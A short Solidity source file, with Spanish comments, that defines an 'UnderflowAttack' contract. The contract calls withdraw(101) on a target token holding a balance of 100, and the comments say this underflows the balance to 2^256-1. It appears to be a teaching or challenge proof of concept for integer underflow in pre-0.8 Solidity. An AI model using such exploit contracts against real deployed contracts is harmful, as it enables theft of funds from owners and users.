// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

interface ITokenUnderflow {
    function withdraw(uint256 _amount) external;
}

contract UnderflowAttack {
    ITokenUnderflow public target;

    constructor(address _target) {
        target = ITokenUnderflow(_target);
    }

    function attack() public {
        // Si el saldo es 100, intentamos retirar 101 para realizar el underflow
        target.withdraw(101);
        // El saldo se vuelve un número enorme (2^256 - 1).
    }
}